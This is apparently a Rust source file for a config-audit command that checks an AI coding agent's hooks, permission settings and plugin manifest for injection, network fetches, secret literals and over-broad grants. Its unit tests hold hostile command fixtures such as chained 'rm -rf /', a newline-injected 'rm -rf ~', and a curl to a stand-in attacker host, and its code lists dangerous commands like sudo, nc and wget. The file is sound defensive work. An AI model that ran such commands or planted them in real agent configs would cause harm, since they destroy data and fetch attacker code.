//! Purpose: AgentShield-style security audit of keel's OWN config surface
//!   — hooks, settings/permissions, and the plugin manifest — for injection
//!   vectors, over-broad permissions, secrets, and misconfiguration.
//! Caller: commands.rs `config-audit` dispatch.
//! Dependencies: std::fs, std::path, serde_json, crate::args, crate::json, crate::runtime.
//! Main Functions: run_config_audit_command, audit_hooks_doc, audit_settings_doc, audit_manifest_doc.
//! Side Effects: Reads config files under the repo and/or harness home; writes a report.
//!
//! Why this exists: the security-and-compliance-auditor skill audits the USER's
//! code. Nothing audited the agent's own configuration — the hooks, permission
//! rules, and manifest that shape what the agent is allowed to do. A
//! prompt-injected or over-broad config is an attack surface distinct from
//! application code. This is the deterministic, rule-based half of an
//! adversarial config audit (the model-driven red-team half stays a skill).
//!
//! Design: each surface has a pure `audit_*_doc(&JsonValue, &mut Vec<Finding>)`
//! rule function and a thin file-reading wrapper. Production and tests both call
//! the pure function, so the rule logic is tested directly with no duplication.

use std::fs;
use std::io::Write;
use std::path::Path;

use serde_json::Value as JsonValue;

use crate::args::FlagSet;
use crate::json::{write_indented, Value};
use crate::runtime::resolve_repository_root;

/// One audit finding. Severity drives the exit code: any `high` fails the audit.
#[derive(Debug, Clone)]
struct Finding {
    severity: Severity,
    surface: String,
    message: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Severity {
    High,
    Medium,
    Low,
}

impl Severity {
    fn label(self) -> &'static str {
        match self {
            Severity::High => "high",
            Severity::Medium => "medium",
            Severity::Low => "low",
        }
    }
}

pub fn run_config_audit_command(
    arguments: &[String],
    standard_output: &mut dyn Write,
    standard_error: &mut dyn Write,
) -> u8 {
    let mut flag_set = FlagSet::new("config-audit");
    flag_set.string_flag("repo-root", "");
    flag_set.bool_flag("json", false);
    if let Err(parse_error) = flag_set.parse(arguments) {
        let _ = writeln!(standard_error, "{}", parse_error.message);
        return 1;
    }
    let repository_root = match resolve_repository_root(flag_set.string_value("repo-root")) {
        Ok(path) => path,
        Err(error) => {
            let _ = writeln!(standard_error, "config-audit: {error}");
            return 1;
        }
    };

    let mut findings = Vec::new();
    audit_json_file(
        &repository_root.join(".claude").join("hooks.json"),
        "hooks.json",
        audit_hooks_doc,
        &mut findings,
    );
    audit_json_file(
        &repository_root.join(".claude").join("settings.json"),
        "settings.json",
        audit_settings_doc,
        &mut findings,
    );
    audit_local_settings_tracking(&repository_root, &mut findings);
    audit_json_file(
        &repository_root.join(".claude-plugin").join("plugin.json"),
        "plugin.json",
        audit_manifest_doc,
        &mut findings,
    );

    let high = findings
        .iter()
        .filter(|finding| finding.severity == Severity::High)
        .count();
    let medium = findings
        .iter()
        .filter(|finding| finding.severity == Severity::Medium)
        .count();
    let low = findings
        .iter()
        .filter(|finding| finding.severity == Severity::Low)
        .count();

    if flag_set.bool_value("json") {
        let payload = Value::Object(vec![
            ("high".into(), Value::Number(high.to_string())),
            ("medium".into(), Value::Number(medium.to_string())),
            ("low".into(), Value::Number(low.to_string())),
            (
                "findings".into(),
                Value::Array(findings.iter().map(finding_to_value).collect()),
            ),
        ]);
        if write_indented(standard_output, &payload).is_err() {
            return 1;
        }
        return if high > 0 { 2 } else { 0 };
    }

    let _ = writeln!(
        standard_output,
        "config-audit: {high} high, {medium} medium, {low} low finding(s)"
    );
    if findings.is_empty() {
        let _ = writeln!(
            standard_output,
            "  no findings — hooks, permissions, and manifest look clean"
        );
        return 0;
    }
    for finding in &findings {
        let _ = writeln!(
            standard_output,
            "  [{}] {}: {}",
            finding.severity.label(),
            finding.surface,
            finding.message
        );
    }
    // Fail closed only on high-severity findings so the audit can gate a release
    // without blocking on advisory medium/low notes.
    if high > 0 {
        2
    } else {
        0
    }
}

fn finding_to_value(finding: &Finding) -> Value {
    Value::Object(vec![
        (
            "severity".into(),
            Value::String(finding.severity.label().to_string()),
        ),
        ("surface".into(), Value::String(finding.surface.clone())),
        ("message".into(), Value::String(finding.message.clone())),
    ])
}

type JsonAuditor = fn(&JsonValue, &mut Vec<Finding>);

/// Read one optional config surface and fail closed when it exists but cannot
/// be parsed or has a shape this auditor cannot inspect. Missing optional
/// surfaces remain a clean no-op; an existing unreadable file must never look
/// like an audited, clean file.
fn audit_json_file(path: &Path, surface: &str, audit: JsonAuditor, findings: &mut Vec<Finding>) {
    match read_json(path) {
        Ok(Some(document)) => {
            if !document.is_object() {
                push_schema_finding(
                    findings,
                    surface,
                    "config root must be a JSON object; the audit cannot inspect it",
                );
            } else {
                audit(&document, findings);
            }
        }
        Ok(None) => {}
        Err(error) => findings.push(Finding {
            severity: Severity::High,
            surface: surface.to_string(),
            message: format!("config exists but could not be audited: {error}"),
        }),
    }
}

fn push_schema_finding(findings: &mut Vec<Finding>, surface: &str, message: &str) {
    findings.push(Finding {
        severity: Severity::High,
        surface: surface.to_string(),
        message: format!("unsupported config shape: {message}"),
    });
}

/// Audit a `hooks.json` document. Hook commands are arbitrary shell the agent
/// runs, so shell metacharacters (injection), network fetches (exfiltration),
/// and non-managed commands are flagged.
fn audit_hooks_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    let Some(hooks_value) = document.get("hooks") else {
        return;
    };
    let Some(hooks) = hooks_value.as_object() else {
        push_schema_finding(
            findings,
            "hooks.json:hooks",
            "hooks must be a JSON object; the audit cannot inspect hook commands",
        );
        return;
    };
    for (event_name, entries) in hooks {
        let Some(entries) = entries.as_array() else {
            push_schema_finding(
                findings,
                &format!("hooks.json:hooks.{event_name}"),
                "hook event entries must be a JSON array; the audit cannot inspect commands",
            );
            continue;
        };
        for entry in entries {
            let Some(entry) = entry.as_object() else {
                push_schema_finding(
                    findings,
                    &format!("hooks.json:hooks.{event_name}"),
                    "hook event entries must be JSON objects; the audit cannot inspect commands",
                );
                continue;
            };
            let Some(commands_value) = entry.get("hooks") else {
                continue;
            };
            let Some(commands) = commands_value.as_array() else {
                push_schema_finding(
                    findings,
                    &format!("hooks.json:hooks.{event_name}.hooks"),
                    "hook commands must be a JSON array; the audit cannot inspect commands",
                );
                continue;
            };
            for command_entry in commands {
                let Some(command_entry) = command_entry.as_object() else {
                    push_schema_finding(
                        findings,
                        &format!("hooks.json:hooks.{event_name}.hooks"),
                        "hook command entries must be JSON objects; the audit cannot inspect the command",
                    );
                    continue;
                };
                let command = command_entry.get("command").and_then(JsonValue::as_str);
                let Some(command) = command else {
                    push_schema_finding(
                        findings,
                        &format!("hooks.json:hooks.{event_name}.hooks.command"),
                        "hook command must be a JSON string; the audit cannot inspect it",
                    );
                    continue;
                };
                if contains_shell_metacharacters(command) {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message: format!(
                            "hook command contains shell metacharacters (injection risk): {command}"
                        ),
                    });
                }
                if command.contains("curl") || command.contains("wget") {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message:
                            "hook command fetches from the network — exfiltration/supply-chain risk"
                                .to_string(),
                    });
                }
                if invokes_inline_interpreter(command) {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message: format!(
                            "hook command runs an inline interpreter (arbitrary-code execution distinct from shell chaining): {command}"
                        ),
                    });
                }
                if command_embeds_secret(command) {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message: "hook command embeds what looks like a committed secret literal"
                            .to_string(),
                    });
                }
                if !command.is_empty() && !is_managed_keel_command(command) {
                    findings.push(Finding {
                        severity: Severity::Medium,
                        surface: format!("hooks.json:{event_name}"),
                        message: format!(
                            "hook command is not a managed keel invocation: {command}"
                        ),
                    });
                }
            }
        }
    }
}

/// Audit a `settings.json` document for over-broad or dangerous permission grants.
fn audit_settings_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    if let Some(permissions) = document.get("permissions") {
        let Some(permissions) = permissions.as_object() else {
            push_schema_finding(
                findings,
                "settings.json:permissions",
                "permissions must be a JSON object; the audit cannot inspect permission grants",
            );
            return;
        };
        if let Some(allow) = permissions.get("allow") {
            if !allow.is_array() {
                push_schema_finding(
                    findings,
                    "settings.json:permissions.allow",
                    "permissions.allow must be a JSON array; the audit cannot inspect allow rules",
                );
            }
        }
        if let Some(additional_directories) = permissions.get("additionalDirectories") {
            if !additional_directories.is_array() {
                push_schema_finding(
                    findings,
                    "settings.json:permissions.additionalDirectories",
                    "permissions.additionalDirectories must be a JSON array; the audit cannot inspect filesystem grants",
                );
            }
        }
    }
    let default_mode = document
        .get("permissions")
        .and_then(|permissions| permissions.get("defaultMode"))
        .and_then(JsonValue::as_str)
        .unwrap_or_default();
    if default_mode == "bypassPermissions" {
        findings.push(Finding {
            severity: Severity::High,
            surface: "settings.json:permissions.defaultMode".to_string(),
            message:
                "defaultMode is `bypassPermissions` — the agent runs tools without confirmation"
                    .to_string(),
        });
    }
    if let Some(allow) = document
        .get("permissions")
        .and_then(|permissions| permissions.get("allow"))
        .and_then(JsonValue::as_array)
    {
        for rule in allow {
            let Some(rule_text) = rule.as_str() else {
                push_schema_finding(
                    findings,
                    "settings.json:permissions.allow",
                    "allow rules must be JSON strings; the audit cannot inspect this rule",
                );
                continue;
            };
            if rule_text == "Bash" || rule_text == "Bash(*)" || rule_text == "Bash(*:*)" {
                findings.push(Finding {
                    severity: Severity::High,
                    surface: "settings.json:permissions.allow".to_string(),
                    message: format!(
                        "unscoped Bash allow rule grants arbitrary command execution: {rule_text}"
                    ),
                });
            } else if is_dangerous_bash_subcommand(rule_text) {
                // A SCOPED Bash rule the unscoped check above misses, but scoped
                // to a destructive/privilege command (sudo, rm, curl, chmod, …).
                // Auto-allowing these is as dangerous as an unscoped grant.
                findings.push(Finding {
                    severity: Severity::High,
                    surface: "settings.json:permissions.allow".to_string(),
                    message: format!(
                        "allow rule auto-approves a dangerous command without confirmation: {rule_text}"
                    ),
                });
            } else if is_wildcard_filesystem_scope(rule_text) {
                // A scope so broad (`Read(/**)`, `Write(~/**)`) it grants the
                // whole filesystem — effectively unscoped despite the parentheses.
                findings.push(Finding {
                    severity: Severity::High,
                    surface: "settings.json:permissions.allow".to_string(),
                    message: format!(
                        "allow rule grants filesystem-wide access (root/home wildcard): {rule_text}"
                    ),
                });
            } else if is_wildcard_webfetch(rule_text) {
                // WebFetch/WebSearch with a wildcard domain lets the agent reach
                // any host — an exfiltration/SSRF surface worth a deliberate scope.
                findings.push(Finding {
                    severity: Severity::Medium,
                    surface: "settings.json:permissions.allow".to_string(),
                    message: format!(
                        "allow rule permits network fetches to ANY domain (wildcard): {rule_text}"
                    ),
                });
            } else if is_unscoped_sensitive_allow(rule_text) {
                // A bare tool name with no scope grants the whole tool. For
                // filesystem- and network-capable tools (Write/Edit/WebFetch/
                // mcp__*) that is a broad grant worth a deliberate decision.
                findings.push(Finding {
                    severity: Severity::Medium,
                    surface: "settings.json:permissions.allow".to_string(),
                    message: format!(
                        "unscoped allow rule grants a sensitive tool without scoping: {rule_text}"
                    ),
                });
            }
        }
    }

    // enableAllProjectMcpServers auto-trusts EVERY MCP server a project declares,
    // including ones added after review — a standing supply-chain surface.
    if document
        .get("enableAllProjectMcpServers")
        .and_then(JsonValue::as_bool)
        == Some(true)
    {
        findings.push(Finding {
            severity: Severity::Medium,
            surface: "settings.json:enableAllProjectMcpServers".to_string(),
            message:
                "enableAllProjectMcpServers auto-trusts every project MCP server without review"
                    .to_string(),
        });
    }

    // apiKeyHelper runs a shell command to mint the API key on every request; a
    // compromised or over-broad helper is a credential-exposure surface.
    if let Some(helper) = document.get("apiKeyHelper").and_then(JsonValue::as_str) {
        if !helper.trim().is_empty() {
            findings.push(Finding {
                severity: Severity::Medium,
                surface: "settings.json:apiKeyHelper".to_string(),
                message: "apiKeyHelper runs a command to produce credentials — review it handles secrets safely"
                    .to_string(),
            });
        }
    }

    // additionalDirectories extends the agent's filesystem reach beyond the
    // workspace. An absolute, home (`~`), or parent (`..`) path grants access
    // outside the project tree.
    if let Some(dirs) = document
        .get("permissions")
        .and_then(|permissions| permissions.get("additionalDirectories"))
        .and_then(JsonValue::as_array)
    {
        for dir in dirs {
            let Some(dir_text) = dir.as_str() else {
                push_schema_finding(
                    findings,
                    "settings.json:permissions.additionalDirectories",
                    "additionalDirectories entries must be JSON strings; the audit cannot inspect this path",
                );
                continue;
            };
            if reaches_outside_workspace(dir_text) {
                findings.push(Finding {
                    severity: Severity::Medium,
                    surface: "settings.json:permissions.additionalDirectories".to_string(),
                    message: format!(
                        "additionalDirectories grants access outside the workspace: {dir_text}"
                    ),
                });
            }
        }
    }
}

/// A SCOPED Bash allow rule (`Bash(<cmd>:*)`) whose command is destructive or
/// privilege-escalating. The unscoped-Bash check catches `Bash`/`Bash(*)`; this
/// catches the subtler `Bash(sudo:*)` form that auto-approves a specific
/// dangerous command without confirmation.
fn is_dangerous_bash_subcommand(rule_text: &str) -> bool {
    let Some(inner) = rule_text
        .strip_prefix("Bash(")
        .and_then(|rest| rest.strip_suffix(')'))
    else {
        return false;
    };
    // The command is the token before the first `:` (the arg matcher).
    let command = inner.split(':').next().unwrap_or(inner).trim();
    let base = command.rsplit(['/', '\\']).next().unwrap_or(command);
    matches!(
        base,
        "sudo"
            | "rm"
            | "rmdir"
            | "curl"
            | "wget"
            | "chmod"
            | "chown"
            | "dd"
            | "mkfs"
            | "eval"
            | "sh"
            | "bash"
            | "zsh"
            | "nc"
            | "ncat"
    )
}

/// A filesystem-tool scope (`Read(...)`, `Write(...)`, `Edit(...)`) whose pattern
/// reaches the filesystem root or the home directory — so broad it is
/// effectively unscoped even though it has parentheses.
fn is_wildcard_filesystem_scope(rule_text: &str) -> bool {
    let fs_tool = ["Read(", "Write(", "Edit("]
        .iter()
        .find_map(|prefix| rule_text.strip_prefix(prefix));
    let Some(inner) = fs_tool.and_then(|rest| rest.strip_suffix(')')) else {
        return false;
    };
    let pattern = inner.trim();
    pattern == "/**"
        || pattern == "//**"
        || pattern == "/*"
        || pattern.starts_with("~/") && (pattern.ends_with("**") || pattern == "~/*")
        || pattern == "~"
        || pattern == "**"
        || pattern == "*"
}

/// A `WebFetch`/`WebSearch` allow rule with a wildcard (or absent) domain scope,
/// letting the agent reach any host.
fn is_wildcard_webfetch(rule_text: &str) -> bool {
    if rule_text == "WebFetch" || rule_text == "WebSearch" {
        // Bare form is handled by is_unscoped_sensitive_allow; not here.
        return false;
    }
    for prefix in ["WebFetch(", "WebSearch("] {
        if let Some(inner) = rule_text
            .strip_prefix(prefix)
            .and_then(|r| r.strip_suffix(')'))
        {
            let scope = inner.trim();
            return scope == "*"
                || scope == "domain:*"
                || scope.ends_with(":*") && scope.starts_with("domain:") && scope.contains('*');
        }
    }
    false
}

/// Whether a directory path reaches outside the workspace tree: absolute
/// (`/x`, `C:\x`), home-relative (`~`), or parent-traversing (`..`).
fn reaches_outside_workspace(dir: &str) -> bool {
    let trimmed = dir.trim();
    if trimmed.is_empty() {
        return false;
    }
    trimmed.starts_with('/')
        || trimmed.starts_with('~')
        || trimmed.starts_with("..")
        || trimmed.contains("/../")
        || trimmed.contains("\\..\\")
        // Windows drive-absolute, e.g. C:\ or C:/
        || (trimmed.len() >= 3
            && trimmed.as_bytes()[1] == b':'
            && matches!(trimmed.as_bytes()[2], b'\\' | b'/'))
}

/// A bare (unscoped) allow rule for a sensitive tool — `Write`, `Edit`,
/// `WebFetch`, `WebSearch`, or any `mcp__*` — grants the entire tool with no
/// pattern restriction. Not as severe as unscoped `Bash` (handled separately as
/// high), but worth a medium flag so least-privilege scoping is a conscious
/// choice. A rule containing `(` is already scoped, so it is exempt.
fn is_unscoped_sensitive_allow(rule_text: &str) -> bool {
    if rule_text.contains('(') {
        return false;
    }
    matches!(rule_text, "Write" | "Edit" | "WebFetch" | "WebSearch")
        || rule_text.starts_with("mcp__")
}

/// Audit a plugin manifest document for MCP server env values that look like
/// committed secret literals, and for servers wired to a remote network URL
/// (a supply-chain/exfiltration surface the agent talks to on every session).
fn audit_manifest_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    if let Some(servers) = document.get("mcpServers") {
        if let Some(servers) = servers.as_object() {
            for (server_name, server) in servers {
                if !server.is_object() {
                    push_schema_finding(
                        findings,
                        &format!("plugin.json:mcpServers.{server_name}"),
                        "MCP server entries must be JSON objects; the audit cannot inspect their command, endpoint, or env",
                    );
                } else if let Some(env) = server.get("env") {
                    if !env.is_object() {
                        push_schema_finding(
                            findings,
                            &format!("plugin.json:mcpServers.{server_name}.env"),
                            "MCP server env must be a JSON object; the audit cannot inspect its values",
                        );
                    }
                }
            }
        } else {
            push_schema_finding(
                findings,
                "plugin.json:mcpServers",
                "mcpServers must be a JSON object; the audit cannot inspect server endpoints",
            );
        }
    }
    if let Some(experimental) = document.get("experimental") {
        let Some(experimental) = experimental.as_object() else {
            push_schema_finding(
                findings,
                "plugin.json:experimental",
                "experimental must be a JSON object; the audit cannot inspect monitor commands",
            );
            return;
        };
        if let Some(monitors) = experimental.get("monitors") {
            if !monitors.is_array() {
                push_schema_finding(
                    findings,
                    "plugin.json:experimental.monitors",
                    "experimental.monitors must be a JSON array; the audit cannot inspect monitor commands",
                );
            }
        }
    }
    // mcpServers is optional — a manifest with only experimental.monitors (and
    // no MCP servers) must still reach the monitors audit below, so do not
    // early-return here; skip the server loop instead.
    if let Some(servers) = document.get("mcpServers").and_then(JsonValue::as_object) {
        for (server_name, server) in servers {
            // A `url`/`baseUrl`/`endpoint` pointing at a non-local http(s) host means
            // the agent's tool calls flow to a third party. Flag medium so an
            // intentional remote server is a deliberate, reviewed choice rather than
            // a silent default.
            for url_key in ["url", "baseUrl", "endpoint"] {
                if let Some(url) = server.get(url_key).and_then(JsonValue::as_str) {
                    if is_remote_network_url(url) {
                        findings.push(Finding {
                        severity: Severity::Medium,
                        surface: format!("plugin.json:mcpServers.{server_name}.{url_key}"),
                        message: format!(
                            "MCP server points at a remote network URL — tool calls flow to a third party: {url}"
                        ),
                    });
                    }
                }
            }
            let Some(env) = server.get("env").and_then(JsonValue::as_object) else {
                continue;
            };
            for (key, value) in env {
                let Some(value_text) = value.as_str() else {
                    push_schema_finding(
                        findings,
                        &format!("plugin.json:mcpServers.{server_name}.env.{key}"),
                        "MCP env values must be JSON strings; the audit cannot inspect this value",
                    );
                    continue;
                };
                if looks_like_secret_literal(value_text) {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("plugin.json:mcpServers.{server_name}.env.{key}"),
                        message: "MCP server env value looks like a committed secret literal"
                            .to_string(),
                    });
                }
            }
        }
    }

    // experimental.monitors[].command — background commands the agent runs, the
    // same shell-injection/exfiltration surface as hooks. config-audit must
    // practice what it preaches: keel's own plugin.json ships a monitor with a
    // piped command, which would be flagged here if it were a hook.
    let Some(monitors) = document
        .get("experimental")
        .and_then(|exp| exp.get("monitors"))
        .and_then(JsonValue::as_array)
    else {
        return;
    };
    for monitor in monitors {
        let Some(monitor) = monitor.as_object() else {
            push_schema_finding(
                findings,
                "plugin.json:experimental.monitors",
                "monitor entries must be JSON objects; the audit cannot inspect commands",
            );
            continue;
        };
        let monitor_name = monitor
            .get("name")
            .and_then(JsonValue::as_str)
            .unwrap_or("unnamed");
        let Some(command) = monitor.get("command").and_then(JsonValue::as_str) else {
            if monitor.get("command").is_some() {
                push_schema_finding(
                    findings,
                    &format!("plugin.json:experimental.monitors.{monitor_name}.command"),
                    "monitor command must be a JSON string; the audit cannot inspect it",
                );
            }
            continue;
        };
        if command.is_empty() {
            continue;
        }
        let surface = format!("plugin.json:experimental.monitors.{monitor_name}");
        if contains_shell_metacharacters(command) {
            findings.push(Finding {
                severity: Severity::High,
                surface: surface.clone(),
                message: format!(
                    "monitor command contains shell metacharacters (injection risk): {command}"
                ),
            });
        }
        if command.contains("curl") || command.contains("wget") {
            findings.push(Finding {
                severity: Severity::High,
                surface: surface.clone(),
                message:
                    "monitor command fetches from the network — exfiltration/supply-chain risk"
                        .to_string(),
            });
        }
        if invokes_inline_interpreter(command) {
            findings.push(Finding {
                severity: Severity::High,
                surface: surface.clone(),
                message: format!(
                    "monitor command runs an inline interpreter (arbitrary-code execution): {command}"
                ),
            });
        }
        if command_embeds_secret(command) {
            findings.push(Finding {
                severity: Severity::High,
                surface: surface.clone(),
                message: "monitor command embeds what looks like a committed secret literal"
                    .to_string(),
            });
        }
    }
}

/// Whether `url` is a remote http(s) endpoint (not localhost/loopback). A local
/// server (`http://localhost`, `127.0.0.1`, `::1`) is the normal stdio/loopback
/// case and is not flagged; anything else over http(s) sends data off-box.
fn is_remote_network_url(url: &str) -> bool {
    let lowered = url.to_ascii_lowercase();
    if !(lowered.starts_with("http://") || lowered.starts_with("https://")) {
        return false;
    }
    let host = lowered
        .trim_start_matches("https://")
        .trim_start_matches("http://");
    !(host.starts_with("localhost")
        || host.starts_with("127.0.0.1")
        || host.starts_with("[::1]")
        || host.starts_with("0.0.0.0"))
}

/// A committed `settings.local.json` is a hygiene smell: it is per-developer and
/// should be gitignored. Flag (low) if it is tracked by git.
fn audit_local_settings_tracking(repository_root: &Path, findings: &mut Vec<Finding>) {
    let local_path = repository_root.join(".claude").join("settings.local.json");
    if local_path.is_file() && path_is_git_tracked(repository_root, ".claude/settings.local.json") {
        findings.push(Finding {
            severity: Severity::Low,
            surface: "settings.local.json".to_string(),
            message: "settings.local.json is git-tracked — local overrides should be gitignored"
                .to_string(),
        });
    }
}

/// Whether `command` is a genuine managed `keel` invocation — i.e. its
/// FIRST token is the keel binary. A substring test was insufficient:
/// a malicious command like `evilbin --note keel` or
/// `keel hook x & evilbin` contains the substring yet is not (only) a
/// managed invocation, so the substring check let it suppress the "not managed"
/// finding. Anchoring on the first token closes that bypass; chaining/injection
/// in the rest of the line is independently caught by
/// `contains_shell_metacharacters`.
fn is_managed_keel_command(command: &str) -> bool {
    let first_token = command.split_whitespace().next().unwrap_or_default();
    // Strip any directory prefix and a trailing `.exe` so an absolute or
    // Windows path to the binary still matches by basename.
    let basename = first_token
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(first_token);
    let stem = basename
        .strip_suffix(".exe")
        .or_else(|| basename.strip_suffix(".EXE"))
        .unwrap_or(basename);
    stem.eq_ignore_ascii_case("keel")
}

fn contains_shell_metacharacters(command: &str) -> bool {
    // Managed hook commands are bare argv (`keel hook <slug>`); pipes,
    // substitutions, redirects, chaining, backgrounding, or embedded newlines
    // indicate a hand-rolled shell hook. `&` (single) is a command separator on
    // cmd.exe and backgrounds on bash; a newline/CR runs a second command
    // entirely — both were previously missed and let an injected second command
    // slip past the detector.
    command.contains("&&")
        || command.contains("||")
        || command.contains('|')
        || command.contains('&')
        || command.contains(';')
        || command.contains('`')
        || command.contains("$(")
        || command.contains('>')
        || command.contains('<')
        || command.chars().any(|character| character.is_control())
}

/// Whether the command runs an inline interpreter — `bash -c "..."`,
/// `python -c "..."`, `node -e "..."`, `sh -c`, `eval ...`, `perl -e`, `ruby -e`.
/// This is an arbitrary-code-execution class DISTINCT from shell chaining: a
/// command can pass `contains_shell_metacharacters` (no pipes or `;`) yet still
/// run an attacker-controlled program through `-c`/`-e`/`eval`. AgentShield-style
/// auditors flag this separately because the payload is the interpreter's input,
/// not the shell's. Word-boundary matched so a path like `/usr/bin/evaluate`
/// does not trip the `eval` rule.
fn invokes_inline_interpreter(command: &str) -> bool {
    let lowered = command.to_ascii_lowercase();
    // Interpreter inline-code flags: `-c <code>` (sh/bash/python/zsh) and
    // `-e <code>` (node/perl/ruby). Match the flag as a standalone token.
    let has_inline_flag = lowered
        .split_whitespace()
        .any(|token| matches!(token, "-c" | "-e" | "--command" | "--eval"));
    let runs_interpreter = [
        "bash ", "sh ", "zsh ", "python ", "python3 ", "node ", "perl ", "ruby ",
    ]
    .iter()
    .any(|interp| lowered.starts_with(interp) || lowered.contains(&format!("/{interp}")));
    let has_eval_builtin = lowered
        .split(|c: char| c.is_whitespace() || c == ';' || c == '&' || c == '|')
        .any(|token| token == "eval");
    (has_inline_flag && runs_interpreter) || has_eval_builtin
}

/// Whether a hook COMMAND line embeds a secret literal as one of its tokens —
/// e.g. `keel hook x --token AKIA...`. Distinct from auditing MCP env
/// values: a secret pasted onto a hook command line is committed to config and
/// shows up in process listings. Reuses `looks_like_secret_literal` per token so
/// the detection rule stays in one place.
fn command_embeds_secret(command: &str) -> bool {
    command.split_whitespace().any(looks_like_secret_literal)
}

fn looks_like_secret_literal(value: &str) -> bool {
    // Env values that reference another variable (`${FOO}`/`$FOO`) or are empty
    // are fine. A long opaque token, or known key prefixes, are suspicious.
    if value.is_empty() || value.contains('$') {
        return false;
    }
    let upper = value.to_ascii_uppercase();
    let prefixed = ["AKIA", "SK-", "GHP_", "XOXB-", "-----BEGIN"]
        .iter()
        .any(|prefix| upper.starts_with(prefix));
    let long_token = value.len() >= 32
        && value
            .chars()
            .filter(|character| character.is_ascii_alphanumeric())
            .count()
            >= 28;
    prefixed || long_token
}

fn read_json(path: &Path) -> Result<Option<JsonValue>, String> {
    let text = match fs::read_to_string(path) {
        Ok(text) => text,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(format!("read {}: {error}", path.display())),
    };
    serde_json::from_str(&text)
        .map(Some)
        .map_err(|error| format!("parse {}: {error}", path.display()))
}

/// Best-effort git-tracked check. Returns false when git is unavailable so the
/// audit never errors on a non-git checkout.
fn path_is_git_tracked(repository_root: &Path, relative_path: &str) -> bool {
    crate::runtime::run_command(
        "git",
        &[
            "ls-files".to_string(),
            "--error-unmatch".to_string(),
            relative_path.to_string(),
        ],
        Some(repository_root),
    )
    .map(|result| result.code == 0)
    .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_managed_hook_produces_no_findings() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"keel hook pre-tool-use"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }

    #[test]
    fn shell_metacharacter_hook_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"keel hook pre-tool-use && rm -rf /"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.message.contains("shell metacharacters")));
    }

    #[test]
    fn single_ampersand_background_hook_is_flagged() {
        // Regression: the detector previously only caught `&&`, so a single `&`
        // (background on bash, separator on cmd.exe) slipped through even though
        // it chains a second command.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"keel hook pre-tool-use & maliciousbin"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("shell metacharacters")),
            "single & must be flagged: {findings:?}"
        );
    }

    #[test]
    fn newline_injected_hook_is_flagged() {
        // A newline runs a second command outright; it must be caught even when
        // the line starts with the managed binary.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"keel hook x\nrm -rf ~"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.severity == Severity::High && f.message.contains("shell metacharacters")),
            "embedded newline must be flagged: {findings:?}"
        );
    }

    #[test]
    fn substring_keel_does_not_suppress_unmanaged_finding() {
        // Regression: the medium catch-all used a substring test, so a command
        // merely MENTIONING keel evaded the "not managed" finding. The
        // structural first-token check must still flag a non-managed command.
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"evilbin --note keel"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(
            findings
                .iter()
                .any(|f| f.message.contains("not a managed keel invocation")),
            "first-token check must flag non-managed command: {findings:?}"
        );
    }

    #[test]
    fn managed_command_with_path_prefix_counts_as_managed() {
        // An absolute/Windows path to the managed binary must still count as
        // managed by basename, so a legitimate hook is not noise-flagged.
        assert!(is_managed_keel_command("keel hook pre-tool-use"));
        assert!(is_managed_keel_command("/usr/local/bin/keel hook stop"));
        assert!(is_managed_keel_command(
            "C:\\tools\\keel.exe hook user-prompt-submit"
        ));
        assert!(!is_managed_keel_command("evilbin keel"));
        assert!(!is_managed_keel_command(""));
    }

    #[test]
    fn network_fetch_hook_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"SessionStart":[{"matcher":"","hooks":[{"type":"command","command":"curl http://evil.example/x"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn bypass_permissions_mode_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"defaultMode":"bypassPermissions"}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.message.contains("bypassPermissions")));
    }

    #[test]
    fn unscoped_bash_allow_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(r#"{"permissions":{"allow":["Bash"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings
            .iter()
